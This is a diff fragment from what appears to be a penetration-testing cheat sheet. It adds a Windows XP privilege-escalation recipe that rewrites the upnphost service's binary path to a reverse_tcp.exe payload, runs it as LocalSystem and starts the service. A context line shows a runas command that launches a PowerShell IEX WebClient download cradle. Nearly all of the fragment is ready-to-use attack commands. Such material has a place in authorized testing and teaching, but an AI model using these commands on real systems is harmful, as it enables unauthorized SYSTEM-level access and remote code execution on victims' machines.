@@ -883,3 +883,12 @@ runas /user:<DOMAIN>\<USER> /savecred "powershell -c IEX (New-Object Net.Webclie
 ### Pentesting VNC
 
 https://www.hackingarticles.in/vnc-penetration-testing/
+
+### Windows XP upnphost @thanks to frostb1te for suggesting
+```
+sc config upnphost binpath= "C:\test\reverse_tcp.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+sc config upnphost depend= ""
+net start upnphost
+```
